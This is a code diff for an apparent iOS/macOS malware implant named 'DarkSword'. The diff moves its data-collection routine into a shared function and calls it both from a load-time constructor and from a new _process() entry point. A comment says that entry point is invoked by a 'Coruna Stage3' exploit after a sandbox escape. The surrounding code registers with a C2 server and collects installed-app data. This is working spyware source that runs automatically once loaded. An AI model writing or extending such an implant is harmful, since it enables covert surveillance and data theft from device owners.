@@ -336,10 +336,9 @@ void collect_installed_apps(int device_id) {
     }
 }
 
-// === Main Entry Point ===
-__attribute__((constructor))
-static void darksword_agent_init(void) {
-    NSLog(@"[DarkSword] Agent loaded, starting collection...");
+// === Data Collection Function ===
+void darksword_agent_collect(void) {
+    NSLog(@"[DarkSword] Starting data collection...");
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         // Get device ID from C2 (register first)
@@ -396,4 +395,18 @@ static void darksword_agent_init(void) {
         
         NSLog(@"[DarkSword] Collection complete!");
     });
+}
+
+// === Main Entry Points ===
+// _process is called by Coruna Stage3 after sandbox escape
+void _process(void) {
+    NSLog(@"[DarkSword] _process called by Coruna Stage3");
+    darksword_agent_collect();
+}
+
+__attribute__((constructor))
+static void darksword_agent_init(void) {
+    NSLog(@"[DarkSword] Agent loaded via constructor");
+    // Auto-collect when loaded
+    darksword_agent_collect();
 }
